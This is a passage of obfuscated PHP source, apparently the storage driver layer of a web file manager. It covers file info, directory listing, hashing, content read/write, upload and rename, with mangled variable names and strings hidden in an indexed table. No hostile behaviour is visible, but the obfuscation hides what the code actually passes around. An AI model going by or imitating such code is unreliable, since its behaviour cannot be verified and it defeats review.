($ªƒ∫äíô) { return array($åÿ…ÅÍ®[32] => $∂¶˘ï–á, $åÿ…ÅÍ®[78] => $this->getPathOuter($ì™ÕÅÔÒ), $åÿ…ÅÍ®[33] => $åÿ…ÅÍ®[79]); } $·ﬁøéûä = array($åÿ…ÅÍ®[32] => $∂¶˘ï–á, $åÿ…ÅÍ®[78] => $this->getPathOuter($ì™ÕÅÔÒ), $åÿ…ÅÍ®[33] => $åÿ…ÅÍ®[79], $åÿ…ÅÍ®[193] => @filectime($ì™ÕÅÔÒ), $åÿ…ÅÍ®[86] => @filemtime($ì™ÕÅÔÒ), $åÿ…ÅÍ®[1362] => @fileatime($ì™ÕÅÔÒ), $åÿ…ÅÍ®[1363] => is_readable($ì™ÕÅÔÒ), $åÿ…ÅÍ®[1364] => is_writable($ì™ÕÅÔÒ), $åÿ…ÅÍ®[1365] => get_mode($ì™ÕÅÔÒ)); return $·ﬁøéûä; } private function fileInfo($Ôû˚ê—Ö, $àëáïòÚ = false) { $Ñ”ÑƒÅÙ =& $_SERVER[Çâä∆◊¡]; $üÒÁê¨† = $this->iconvApp($this->pathThis($Ôû˚ê—Ö)); if ($àëáïòÚ) { return array($Ñ”ÑƒÅÙ[32] => $üÒÁê¨†, $Ñ”ÑƒÅÙ[78] => $this->getPathOuter($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[33] => $Ñ”ÑƒÅÙ[192], $Ñ”ÑƒÅÙ[80] => $this->size($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[167] => $this->ext($üÒÁê¨†)); } $±ÊØ˙Éœ = array($Ñ”ÑƒÅÙ[32] => $üÒÁê¨†, $Ñ”ÑƒÅÙ[78] => $this->getPathOuter($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[33] => $Ñ”ÑƒÅÙ[192], $Ñ”ÑƒÅÙ[193] => @filectime($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[86] => @filemtime($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[1362] => @fileatime($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[80] => $this->size($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[167] => $this->ext($üÒÁê¨†), $Ñ”ÑƒÅÙ[1363] => is_readable($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[1364] => is_writable($Ôû˚ê—Ö), $Ñ”ÑƒÅÙ[1365] => get_mode($Ôû˚ê—Ö)); return $±ÊØ˙Éœ; } public function exist($˚ªﬁÄñ•) { $˚ªﬁÄñ• = $this->iconvSystem($˚ªﬁÄñ•); return @file_exists($˚ªﬁÄñ•); } public function isFile($øﬁÅÓì¥) { $øﬁÅÓì¥ = $this->iconvSystem($øﬁÅÓì¥); return @is_file($øﬁÅÓì¥); } public function isFolder($Û˝ø®€÷) { $Û˝ø®€÷ = $this->iconvSystem($Û˝ø®€÷); return @is_dir($Û˝ø®€÷); } public function listPath($Êú¶ì™˝, $ÚèÙƒÈ = false) { $åîî˜ÒÌ =& $_SERVER[Çâä∆◊¡]; $Êú¶ì™˝ = $this->iconvSystem($Êú¶ì™˝); $Êú¶ì™˝ = rtrim($Êú¶ì™˝, $åîî˜ÒÌ[8]) . $åîî˜ÒÌ[8]; $¥ÔﬁŒ–™ = array($åîî˜ÒÌ[77] => array(), $åîî˜ÒÌ[76] => array()); if (!($¥Ø∏—±© = @opendir($Êú¶ì™˝))) { return $¥ÔﬁŒ–™; } while (($ºéõá÷Ù = readdir($¥Ø∏—±©)) !== !1) { if ($ºéõá÷Ù == $åîî˜ÒÌ[10] || $ºéõá÷Ù == $åîî˜ÒÌ[1359]) { continue; } $„ãó÷Îﬂ = $Êú¶ì™˝ . $ºéõá÷Ù; if (is_file($„ãó÷Îﬂ)) { $¥ÔﬁŒ–™[$åîî˜ÒÌ[76]][] = $this->fileInfo($„ãó÷Îﬂ, $ÚèÙƒÈ); } else { $¥ÔﬁŒ–™[$åîî˜ÒÌ[77]][] = $this->folderInfo($„ãó÷Îﬂ, $ÚèÙƒÈ); } } closedir($¥Ø∏—±©); return $¥ÔﬁŒ–™; } public function listAll($Õ≠ãﬁ∆¨, &$¿±˛ØÌÂ = array()) { $•¥˛˚ØŒ =& $_SERVER[Çâä∆◊¡]; $Õ≠ãﬁ∆¨ = $this->iconvSystem($Õ≠ãﬁ∆¨); $Õ≠ãﬁ∆¨ = rtrim($Õ≠ãﬁ∆¨, $•¥˛˚ØŒ[8]) . $•¥˛˚ØŒ[8]; if (!($Ì¿„Á±Ö = @opendir($Õ≠ãﬁ∆¨))) { return $¿±˛ØÌÂ; } while (($˛áÉ∏⁄» = readdir($Ì¿„Á±Ö)) !== !1) { if ($˛áÉ∏⁄» == $•¥˛˚ØŒ[10] || $˛áÉ∏⁄» == $•¥˛˚ØŒ[1359]) { continue; } $üßå˝≠  = $Õ≠ãﬁ∆¨ . $˛áÉ∏⁄»; if (is_dir($üßå˝≠ ) && !is_link($üßå˝≠ )) { $¿±˛ØÌÂ[] = array($•¥˛˚ØŒ[78] => $üßå˝≠  . $•¥˛˚ØŒ[8], $•¥˛˚ØŒ[79] => 1, $•¥˛˚ØŒ[86] => @filemtime($üßå˝≠ ), $•¥˛˚ØŒ[80] => 0); $this->listAll($üßå˝≠ , $¿±˛ØÌÂ); } else { $¿±˛ØÌÂ[] = array($•¥˛˚ØŒ[78] => $üßå˝≠ , $•¥˛˚ØŒ[79] => 0, $•¥˛˚ØŒ[86] => @filemtime($üßå˝≠ ), $•¥˛˚ØŒ[80] => $this->size($üßå˝≠ )); } } closedir($Ì¿„Á±Ö); return $¿±˛ØÌÂ; } public function has($ƒÛ˙Ü≤ƒ, $´‰Ù√ì≤ = false, $ØËÀê›Û = true) { $º•ñßº∞ =& $_SERVER[Çâä∆◊¡]; $ƒÛ˙Ü≤ƒ = $this->iconvSystem($ƒÛ˙Ü≤ƒ); $ƒÛ˙Ü≤ƒ = rtrim($ƒÛ˙Ü≤ƒ, $º•ñßº∞[8]) . $º•ñßº∞[8]; if (!($…ÜŸ¸˝Œ = @opendir($ƒÛ˙Ü≤ƒ))) { return !1; } $Ë˜˘ßç‹ = 0; $ˆÜ¬˚Ó√ = 0; $ç‰ì†ÌË = 0; while (($ÜØß‘’à = readdir($…ÜŸ¸˝Œ)) !== !1) { if ($ÜØß‘’à == $º•ñßº∞[10] || $ÜØß‘’à == $º•ñßº∞[1359]) { continue; } $ç”úÆ≥Û = $ƒÛ˙Ü≤ƒ . $ÜØß‘’à; if ($´‰Ù√ì≤) { $ç‰ì†ÌË++; if (@is_file($ç”úÆ≥Û)) { $Ë˜˘ßç‹++; } else { $ˆÜ¬˚Ó√++; } if ($ç‰ì†ÌË > 10000) { break; } continue; } if ($ØËÀê›Û) { if (@is_file($ç”úÆ≥Û)) { return !0; } } else { if (@is_dir($ç”úÆ≥Û . $º•ñßº∞[8])) { return !0; } } } closedir($…ÜŸ¸˝Œ); if ($´‰Ù√ì≤) { return array($º•ñßº∞[202] => $Ë˜˘ßç‹, $º•ñßº∞[203] => $ˆÜ¬˚Ó√); } return !1; } public function hashSimple($Õè—¯…˚) { $∆öÎ‹”Ü =& $_SERVER[Çâä∆◊¡]; if (!$Õè—¯…˚) { return md5($∆öÎ‹”Ü[12]); } $Õè—¯…˚ = $this->iconvSystem($Õè—¯…˚); $ ·◊Ã Ê = $this->size($Õè—¯…˚); $≠˙Ãéø¡ = 200; $∞≠∑Â—å = 50; if ($ ·◊Ã Ê <= $≠˙Ãéø¡ * $∞≠∑Â—å) { return $this->hashMd5($Õè—¯…˚) . $ ·◊Ã Ê; } $¥Ì¬Ç¢Û = $∆öÎ‹”Ü[12]; $óΩ∆èÚÓ = intval($ ·◊Ã Ê / $∞≠∑Â—å); $Áπ‰ËâÖ = fopen($Õè—¯…˚, $∆öÎ‹”Ü[1366]); if (!$Áπ‰ËâÖ) { return $¥Ì¬Ç¢Û; } for ($âÏûá±ì = 0; $âÏûá±ì < $∞≠∑Â—å; $âÏûá±ì++) { fseek_64($Áπ‰ËâÖ, $óΩ∆èÚÓ * $âÏûá±ì); $¥Ì¬Ç¢Û .= fread($Áπ‰ËâÖ, $≠˙Ãéø¡); } fseek_64($Áπ‰ËâÖ, $ ·◊Ã Ê - $≠˙Ãéø¡); $¥Ì¬Ç¢Û .= fread($Áπ‰ËâÖ, $≠˙Ãéø¡); fclose($Áπ‰ËâÖ); return md5($¥Ì¬Ç¢Û) . $ ·◊Ã Ê; } public function getContent($ÆïËî•Ô) { $ÆïËî•Ô = $this->iconvSystem($ÆïËî•Ô); return file_get_contents($ÆïËî•Ô); } public function setContent($˘¸êñä„, $íÔΩÅ®Ö = '') { $˘¸êñä„ = $this->iconvSystem($˘¸êñä„); $Ìﬁ©⁄øü = @file_put_contents($˘¸êñä„, $íÔΩÅ®Ö, LOCK_EX); clearstatcache(); @chmod($˘¸êñä„, $this->pathAuth); return $Ìﬁ©⁄øü === !1 ? !1 : !0; } public function fileSubstr($‰∏¢⁄ó⁄, $ª„≠ß¯È = 0, $∂–ÎÂÑ„ = false) { $…ıÄ€áû =& $_SERVER[Çâä∆◊¡]; $‰∏¢⁄ó⁄ = $this->iconvSystem($‰∏¢⁄ó⁄); if ($∂–ÎÂÑ„ === !1) { $∂–ÎÂÑ„ = $this->size($‰∏¢⁄ó⁄); } if ($∂–ÎÂÑ„ <= 0) { return $…ıÄ€áû[12]; } $êÁ˚äÊ˘ = fopen($‰∏¢⁄ó⁄, $…ıÄ€áû[1366]); if (!$êÁ˚äÊ˘) { return !1; } fseek_64($êÁ˚äÊ˘, $ª„≠ß¯È); $âˆÄ∞éÄ = fread($êÁ˚äÊ˘, $∂–ÎÂÑ„); fclose($êÁ˚äÊ˘); return $âˆÄ∞éÄ; } public function upload($áÂ•≤˚ª, $—à÷∫≥¡, $€ëâÔ¯π = false, $»–Î»Ó  = REPEAT_REPLACE) { if ($€ëâÔ¯π) { return $this->moveFile($—à÷∫≥¡, $áÂ•≤˚ª); } return $this->copyFile($—à÷∫≥¡, $áÂ•≤˚ª); } public function setModifyTime($®ëÄ‹Ñü, $‡ªÉ ú˛ = '') { @touch($®ëÄ‹Ñü, intval($‡ªÉ ú˛)); } public function download($¿¯¨ïêñ, $¶∞˛¢äª) { return $this->iconvSystem($¿¯¨ïêñ); } } goto EÎçè˘à¥Ú; DŸâÑ ıÈ¿: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $·‡Ñ—˚‡ =& $_SERVER[Çâä∆◊¡]; $this->objectDriver = array($·‡Ñ—˚‡[60], $·‡Ñ—˚‡[61], $·‡Ñ—˚‡[62], $·‡Ñ—˚‡[63], $·‡Ñ—˚‡[64], $·‡Ñ—˚‡[65], $·‡Ñ—˚‡[66], $·‡Ñ—˚‡[67], $·‡Ñ—˚‡[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ôÿ¶“êñ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ôÿ¶“êñ, $_SERVER[Çâä∆◊¡][8]); } return $ôÿ¶“êñ; } public function iconvApp($∏’‹∆…´) { return $∏’‹∆…´; } public function iconvSystem($åÈÏå¥Ç) { return $åÈÏå¥Ç; } public function iconvTo($ÌîÓ«Õä, $˘ìÂ¥Åî, $ÒÀÉÆ¸“) { $“¨Ω– £ =& $_SERVER[Çâä∆◊¡]; if (!$ÌîÓ«Õä || !function_exists($“¨Ω– £[69])) { return $ÌîÓ«Õä; } static $í’Ó¨‘ß = array(); $À°¸Œ‰† = $˘ìÂ¥Åî . $“¨Ω– £[70] . $ÒÀÉÆ¸“ . $“¨Ω– £[71] . $ÌîÓ«Õä; if (isset($í’Ó¨‘ß[$À°¸Œ‰†])) { return $í’Ó¨‘ß[$À°¸Œ‰†]; } if (function_exists($“¨Ω– £[72])) { $ΩäöéÚø = @mb_convert_encoding($ÌîÓ«Õä, $ÒÀÉÆ¸“, $˘ìÂ¥Åî); } else { $ΩäöéÚø = @iconv($˘ìÂ¥Åî, $ÒÀÉÆ¸“, $ÌîÓ«Õä); } $ΩäöéÚø = $ΩäöéÚø ? $ΩäöéÚø : $ÌîÓ«Õä; if (strstr($ΩäöéÚø, $“¨Ω– £[73])) { $ΩäöéÚø = str_replace($“¨Ω– £[73], $“¨Ω– £[11], $ΩäöéÚø); } $í’Ó¨‘ß[$˘ìÂ¥Åî . $“¨Ω– £[70] . $ÒÀÉÆ¸“ . $“¨Ω– £[71] . $ÌîÓ«Õä] = $ΩäöéÚø; $í’Ó¨‘ß[$ÒÀÉÆ¸“ . $“¨Ω– £[70] . $˘ìÂ¥Åî . $“¨Ω– £[71] . $ÌîÓ«Õä] = $ÌîÓ«Õä; $í’Ó¨‘ß[$ÒÀÉÆ¸“ . $“¨Ω– £[70] . $˘ìÂ¥Åî . $“¨Ω– £[71] . $ΩäöéÚø] = $ÌîÓ«Õä; $í’Ó¨‘ß[$˘ìÂ¥Åî . $“¨Ω– £[70] . $ÒÀÉÆ¸“ . $“¨Ω– £[71] . $ΩäöéÚø] = $ΩäöéÚø; return $ΩäöéÚø; } public function getPathInner($¸π§áﬁÅ) { $–åÌ‰ˆâ = IO::init($¸π§áﬁÅ); return $–åÌ‰ˆâ->path; } public function getPathOuter($ñâ∞Àº√) { $©’ËﬁÜÓ =& $_SERVER[Çâä∆◊¡]; $À™ŸÅäõ = strlen(trim($this->pathBase, $©’ËﬁÜÓ[8])); $ñâ∞Àº√ = substr(trim($ñâ∞Àº√, $©’ËﬁÜÓ[8]), $À™ŸÅäõ); return $this->pathDriver . $©’ËﬁÜÓ[8] . ltrim($ñâ∞Àº√, $©’ËﬁÜÓ[8]); } public function isParentOf($ﬁíø•¡, $Ì‡Œ‡ﬁ›) { $≤»≈ÀÆÇ =& $_SERVER[Çâä∆◊¡]; $ﬁíø•¡ = rtrim(strtolower($ﬁíø•¡), $≤»≈ÀÆÇ[8]) . $≤»≈ÀÆÇ[8]; $Ì‡Œ‡ﬁ› = rtrim(strtolower($Ì‡Œ‡ﬁ›), $≤»≈ÀÆÇ[8]) . $≤»≈ÀÆÇ[8]; $òùÊÍöÅ = strpos($Ì‡Œ‡ﬁ›, $ﬁíø•¡) === 0; return $òùÊÍöÅ; } public function getType() { $Õª¯Úö  =& $_SERVER[Çâä∆◊¡]; $â£Ã⁄‚• = str_replace($Õª¯Úö [74], $Õª¯Úö [12], get_class($this)); return strtolower($â£Ã⁄‚•); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Á∏´¥ƒ®, $òö¨ñ…ä) { $ı˛œ∞õà =& $_SERVER[Çâä∆◊¡]; $ÿ——“ÑÆ = rtrim($Á∏´¥ƒ®, $ı˛œ∞õà[8]) . $ı˛œ∞õà[8] . $òö¨ñ…ä; $è≤™Ø ò = $this->exist($ÿ——“ÑÆ); return $è≤™Ø ò ? $ÿ——“ÑÆ : !1; } public function setModifyTime($´Äﬁ‚›π, $ÔìÔÄ∑ê = '') { } public function renameObject($®¢∂À°¨, $ÍÌŸŒ‰ú) { $ò¶∂Ã˝Ê =& $_SERVER[Çâä∆◊¡]; $§ü”±íÉ = $ÍÌŸŒ‰ú; Hook::trigger($ò¶∂Ã˝Ê[75], $this, $®¢∂À°¨, $this, $this->pathFather($®¢∂À°¨) . $ÍÌŸŒ‰ú); $®¢∂À°¨ = $this->getPathOuter($®¢∂À°¨); $ÍÌŸŒ‰ú = $this->pathFather($®¢∂À°¨) . $ÍÌŸŒ‰ú; if (IO::isFile($®¢∂À°¨)) { $Ëü∂ãç˚ = IO::copy($®¢∂À°¨, $this->pathFather($®¢∂À°¨), REPEAT_RENAME_FOLDER, $§ü”±íÉ); if ($Ëü∂ãç˚) { IO::remove($®¢∂À°¨); } } else { $Ëü∂ãç˚ = IO::mkdir($ÍÌŸŒ‰ú); if (!$Ëü∂ãç˚) { return !1; } $«§ËÔÎØ = IO::listPath($®¢∂À°¨, !0); $Üò˛∞Ä‚ = array_merge($«§ËÔÎØ[$ò¶∂Ã˝Ê[76]], $«§ËÔÎØ[$ò¶∂Ã˝Ê[77]]); foreach ($Üò˛∞Ä‚ as $ööÑ‹¿°) { IO::move($ööÑ‹¿°[$ò¶∂Ã˝Ê[78]], $ÍÌŸŒ‰ú, REPEAT_RENAME_FOLDER); } IO::remove($®¢∂À°¨); } return $Ëü∂ãç˚ ? $ÍÌŸŒ‰ú : !1; } public function tempFile($ﬁ Âüä› = '', $ÇÈıÎÖ¬ = '') { if (!$ﬁ Âüä›) { $ﬁ Âüä› = rand_string(15); } $Ô†Ç“…¨ = TEMP_FILES . rand_string(15) . $_SERVER[Çâä∆◊¡][8]; @mkdir($Ô†Ç“…¨, DEFAULT_PERRMISSIONS, !0); $ﬁ„ıÁü¸ = $Ô†Ç“…¨ . $ﬁ Âüä›; @touch($ﬁ„ıÁü¸); if ($ÇÈıÎÖ¬) { file_put_contents($ﬁ„ıÁü¸, $ÇÈıÎÖ¬); } return $ﬁ„ıÁü¸; } public function tempFileRemve($Èâæß™Ú) { @unlink($Èâæß™Ú); @rmdir($this->pathFather($Èâæß™Ú)); } public function mkfile($çßò‹‹≠, $◊©¢ñÍ‚ = '', $–‡€”ﬂª = REPEAT_RENAME) { } public function mkdir($¬ÁÑŒÉµ, $ÒÌ∂√ë˘ = REPEAT_SKIP) { } public function delFile($è≠õÖöß) { } public function delFolder($ œÚåíè) { } public function copyFile($—√òÿ˚Æ, $”˙û˛·˝) { } public function moveFile($¬Ã´∑⁄Ø, $±¿ÍäñÎ) { } public function remove($¬Ÿó¨Ãí) { if ($this->isFile($¬Ÿó¨Ãí)) { return $this->delFile($¬Ÿó¨Ãí); } return $this->delFolder($¬Ÿó¨Ãí); } public function rename($ÇøÓ¶Õâ, $Ñó«åµÂ) { } public function exist($Ê§™âá∆) { } public function findByHash($ÃÜ˙≥Æü = '', $ºó∫˝ìæ = '') { return !1; } public function isFile($ÂñÏŸÆÇ) { } public function isFolder($óÃõå«‹) { } public function size($åöÈü˘é) { } public function info($’–Î…ÚÃ) { } public function infoSimple($Ì∆Õ¢¶á) { return $this->info($Ì∆Õ¢¶á); } public function infoAuth($¨áÏìÜ) { return $this->info($¨áÏìÜ); } public function infoFull($öæõÓôÁ) { return $this->info($öæõÓôÁ); } public function infoWithChildren($„à‹õ¡Ê) { $∂ﬂ∑±Ë¡ =& $_SERVER[Çâä∆◊¡]; static $”Âñúæ  = array(); if (isset($”Âñúæ [$„à‹õ¡Ê])) { return $”Âñúæ [$„à‹õ¡Ê]; } $‚ÓÓΩæ∏ = $this->info($„à‹õ¡Ê); if ($‚ÓÓΩæ∏ && $‚ÓÓΩæ∏[$∂ﬂ∑±Ë¡[33]] == $∂ﬂ∑±Ë¡[79]) { $ªÛˆ±êú = array($∂ﬂ∑±Ë¡[80] => 0, $∂ﬂ∑±Ë¡[81] => 0, $∂ﬂ∑±Ë¡[82] => 0); $this->infoChildren($„à‹õ¡Ê, $ªÛˆ±êú); $‚ÓÓΩæ∏[$∂ﬂ∑±Ë¡[80]] = $ªÛˆ±êú[$∂ﬂ∑±Ë¡[80]]; $‚ÓÓΩæ∏[$∂ﬂ∑±Ë¡[83]] = array($∂ﬂ∑±Ë¡[84] => $ªÛˆ±êú[$∂ﬂ∑±Ë¡[81]], $∂ﬂ∑±Ë¡[85] => $ªÛˆ±êú[$∂ﬂ∑±Ë¡[82]]); $”Âñúæ [$„à‹õ¡Ê] = $‚ÓÓΩæ∏; } return $‚ÓÓΩæ∏; } public function listPath($ò™ƒÀ˝Û, $∏∏çÿÎÑ = false) { } public function has($„ÿáª◊, $Õå¡øÛÿ = false, $ê‚°æˆ§ = false) { } public function canRead($πëÛÍéÍ) { } public function canWrite($˛ÇÎ‰Ω˚) { } public function getContent($¥É–üòó) { } public function setContent($∫Œ°©«≠, $Íã√Ú≤À = '') { } protected function infoChildren($Äˆœ˘⁄”, &$Ò¿õéï…) { $”√Ω˛÷« =& $_SERVER[Çâä∆◊¡]; check_abort_echo(); $õÂ†≤«ñ = $this->listPath($Äˆœ˘⁄”, !0); $õÂ†≤«ñ = array_merge($õÂ†≤«ñ[$”√Ω˛÷«[77]], $õÂ†≤«ñ[$”√Ω˛÷«[76]]); foreach ($õÂ†≤«ñ as $µ¿Â‘¿Å) { if ($µ¿Â‘¿Å[$”√Ω˛÷«[33]] == $”√Ω˛÷«[79]) { $Ò¿õéï…[$”√Ω˛÷«[82]]++; $Òá¨√´é = $this->getPathInner($µ¿Â‘¿Å[$”√Ω˛÷«[78]]); $this->infoChildren($Òá¨√´é, $Ò¿õéï…); } else { $Ò¿õéï…[$”√Ω˛÷«[81]]++; $Ò¿õéï…[$”√Ω˛÷«[80]] += $µ¿Â‘¿Å[$”√Ω˛÷«[80]]; } } } public function fileSubstr($›ÅÏÙÉ≤, $ÍÂÏƒâÛ, $Éœõª∆À) { } public function listAll($ºœ…˘¨∆) { } public function listAllMake($ò´ÿ»˜”, &$ñ˘ãº’Õ) { $ˆ≤Å∫§´ =& $_SERVER[Çâä∆◊¡]; check_abort_echo(); $ƒÛÂÒ◊ï = $this->listPath($ò´ÿ»˜”, !0); if (!$ƒÛÂÒ◊ï) { return; } $ªçé≠±‡ = array_merge($ƒÛÂÒ◊ï[$ˆ≤Å∫§´[77]], $ƒÛÂÒ◊ï[$ˆ≤Å∫§´[76]]); foreach ($ªçé≠±‡ as $Ÿ•¸ñ⁄¨) { $∫æ“Œóì = $Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[33]] == $ˆ≤Å∫§´[79]; $‹ÔçÎù∏ = array($ˆ≤Å∫§´[78] => $Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[78]], $ˆ≤Å∫§´[79] => $∫æ“Œóì); if (isset($Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[80]])) { $‹ÔçÎù∏[$ˆ≤Å∫§´[80]] = $Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[80]]; } if (isset($Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[86]])) { $‹ÔçÎù∏[$ˆ≤Å∫§´[86]] = $Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[86]]; } if (!$∫æ“Œóì) { $ñ˘ãº’Õ[] = $‹ÔçÎù∏; continue; } $ñ˘ãº’Õ[] = $‹ÔçÎù∏; $∆öä€¥” = $Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[78]]; $ø‰”ôﬂÕ = $this->pathDriver; if (substr($Ÿ•¸ñ⁄¨[$ˆ≤Å∫§´[78]], 0, strlen($ø‰”ôﬂÕ)) == $ø‰”ôﬂÕ) { $∆öä€¥” = substr($∆öä€¥”, strlen($ø‰”ôﬂÕ)); } $this->listAllMake($∆öä€¥”, $ñ˘ãº’Õ); } } public function listAllSimple($ôŸäŒ©˜) { $‹¡’ößÿ =& $_SERVER[Çâä∆◊¡]; $ÓÓ„π∫í = array(); $ï¸ò÷Ü” = $this->listAll($ôŸäŒ©˜); $¿Ù¸’œ = $this->getPathOuter($ôŸäŒ©˜); foreach ($ï¸ò÷Ü” as $∑√œ«†È) { $›«‚Í‡≈ = $∑√œ«†È[$‹¡’ößÿ[78]]; $Î˚„˜„˝ = $∑√œ«†È[$‹¡’ößÿ[78]]; if (isset($∑√œ«†È[$‹¡’ößÿ[87]])) { $›«‚Í‡≈ = $∑√œ«†È[$‹¡’ößÿ[87]][$‹¡’ößÿ[78]]; $∑√œ«†È[$‹¡’ößÿ[80]] = $∑√œ«†È[$‹¡’ößÿ[87]][$‹¡’ößÿ[80]]; $∑√œ«†È[$‹¡’ößÿ[86]] = $∑√œ«†È[$‹¡’ößÿ[87]][$‹¡’ößÿ[86]]; } else { $Î˚„˜„˝ = substr($∑√œ«†È[$‹¡’ößÿ[78]], strlen(get_path_father($¿Ù¸’œ))); $Î˚„˜„˝ = $‹¡’ößÿ[8] . ltrim($Î˚„˜„˝, $‹¡’ößÿ[8]); } $É±œò»Ó = array($‹¡’ößÿ[78] => $Î˚„˜„˝, $‹¡’ößÿ[79] => $∑√œ«†È[$‹¡’ößÿ[79]]); if (isset($∑√œ«†È[$‹¡’ößÿ[80]]) && !$∑√œ«†È[$‹¡’ößÿ[79]]) { $É±œò»Ó[$‹¡’ößÿ[80]] = $∑√œ«†È[$‹¡’ößÿ[80]]; } if (isset($∑√œ«†È[$‹¡’ößÿ[86]])) { $É±œò»Ó[$‹¡’ößÿ[86]] = $∑√œ«†È[$‹¡’ößÿ[86]]; } if (!$∑√œ«†È[$‹¡’ößÿ[79]]) { $É±œò»Ó[$‹¡’ößÿ[88]] = $›«‚Í‡≈; } $ÓÓ„π∫í[] = $É±œò»Ó; } return $ÓÓ„π∫í; } public function upload($¿£ÈÌÌÍ, $ß´¸‡Ó«, $«óÌ˚¬∫ = false, $õé¢¬î = REPEAT_REPLACE) { } public function uploadFileByID($ÇÊÜıö“, $∫Ë®ƒµÇ, $Â∆Œ≠Óƒ) { } public function uploadFileByPath($’¡»ìÃÌ, $˚•Éóâë, $úıÅÄ£ƒ = array()) { } public function isUploadServer() { $Û∂Ó¿Î =& $_SERVER[Çâä∆◊¡]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Û∂Ó¿Î[89]) { return !0; } return $GLOBALS[$Û∂Ó¿Î[6]][$Û∂Ó¿Î[90]][$Û∂Ó¿Î[91]]; } public function isFileOutServer() { $àñˆ‰º‘ =& $_SERVER[Çâä∆◊¡]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $àñˆ‰º‘[89]) { return !0; } return $GLOBALS[$àñˆ‰º‘[6]][$àñˆ‰º‘[90]][$àñˆ‰º‘[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($±√Ò’‡∂) { $‚—íòú¥ =& $_SERVER[Çâä∆◊¡]; if (!$this->isCdnHost()) { return $±√Ò’‡∂; } return str_replace(trim(get_url_root($±√Ò’‡∂), $‚—íòú¥[8]), trim($this->cdnHost, $‚—íòú¥[8]), $±√Ò’‡∂); } public function uploadLink($âí√–À±, $ò¶ò°Ëë = 0) { $ÄèäΩèÒ =& $_SERVER[Çâä∆◊¡]; if ($this->isUploadServer()) { return; } $ÌŸâ€à´ = $this->getType(); if (!in_array($ÌŸâ€à´, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Â«å∞µœ = 1024 * 1024 * 10; $Ú”‚â¡— = $ò¶ò°Ëë <= $Â«å∞µœ ? $ÄèäΩèÒ[93] : $ÄèäΩèÒ[94]; $°ß˝∞ﬁ¡ = (!$ò¶ò°Ëë ? 1 : ceil($ò¶ò°Ëë / pow(1024, 3))) * 3600 * 4; $ÈÇÕ¬√π = $this->{$Ú”‚â¡—}($âí√–À±, $°ß˝∞ﬁ¡); if ($ÈÇÕ¬√π) { $ÈÇÕ¬√π[$ÄèäΩèÒ[95]] = $âí√–À±; $ÈÇÕ¬√π[$ÄèäΩèÒ[96]] = $ÌŸâ€à´; } return $ÈÇÕ¬√π; } public function uploadFormData($◊ø∆ﬂªÙ, $ıìóÿ æ = 3600) { } public function multiUploadFormData($¥ä√îΩ˙, $πçÄÁÕ∆ = 3600) { } public function download($¿ÿ´‹˙Ò, $Ññÿ¨‚) { } public function ext($öØŸÌÇí) { $„˝Ûì∆© =& $_SERVER[Çâä∆◊¡]; if (strpos($öØŸÌÇí, $„˝Ûì∆©[8]) === -1) { $ Î¶ñµø = $öØŸÌÇí; } else { $ Î¶ñµø = $this->pathThis($öØŸÌÇí); } $…ØÂŒú⁄ = $„˝Ûì∆©[12]; if (strstr($ Î¶ñµø, $„˝Ûì∆©[10])) { $…ØÂŒú⁄ = substr($ Î¶ñµø, strrpos($ Î¶ñµø, $„˝Ûì∆©[10]) + 1); $…ØÂŒú⁄ = strtolower($…ØÂŒú⁄); } if (strlen($…ØÂŒú⁄) > 3 && preg_match($„˝Ûì∆©[97], $…ØÂŒú⁄, $“∂ÍÍ¬≤)) { $…ØÂŒú⁄ = $„˝Ûì∆©[12]; } return $…ØÂŒú⁄; } public function pathThis($¸÷›Ø‰‡) { $í“ΩúéÂ =& $_SERVER[Çâä∆◊¡]; $¸÷›Ø‰‡ = str_replace($í“ΩúéÂ[98], $í“ΩúéÂ[8], rtrim($¸÷›Ø‰‡, $í“ΩúéÂ[8])); $®≥ì‹ï‚ = strrpos($¸÷›Ø‰‡, $í“ΩúéÂ[8]); if ($®≥ì‹ï‚ === !1) { return $¸÷›Ø‰‡; } return substr($¸÷›Ø‰‡, $®≥ì‹ï‚ + 1); } public function pathFather($£û®πÛ¿) { $ìì®‚¬∏ =& $_SERVER[Çâä∆◊¡]; $£û®πÛ¿ = str_replace($ìì®‚¬∏[98], $ìì®‚¬∏[8], rtrim($£û®πÛ¿, $ìì®‚¬∏[8])); $Î¬òë®ñ = strrpos($£û®πÛ¿, $ìì®‚¬∏[8]); if ($Î¬òë®ñ === !1) { return $ìì®‚¬∏[12]; } return substr($£û®πÛ¿, 0, $Î¬òë®ñ + 1); } public function hashSimple($ áÎƒ°€) { $á‡∆‘†◊ =& $_SERVER[Çâä∆◊¡]; if (!$ áÎƒ°€) { return md5($á‡∆‘†◊[12]); } $∑±ùÔ’ô = $this->size($ áÎƒ°€); $ÖäÜ¯π› = 200; $πéÂˆÌπ = 50; if ($∑±ùÔ’ô <= $ÖäÜ¯π› * $πéÂˆÌπ) { return $this->hashMd5($ áÎƒ°€) . $∑±ùÔ’ô; } $∏ªˆÀ◊Ç = intval($∑±ùÔ’ô / $πéÂˆÌπ); $∆˛öóÆ◊ = $á‡∆‘†◊[12]; for ($◊Éä‘êà = 0; $◊Éä‘êà < $πéÂˆÌπ; $◊Éä‘êà++) { 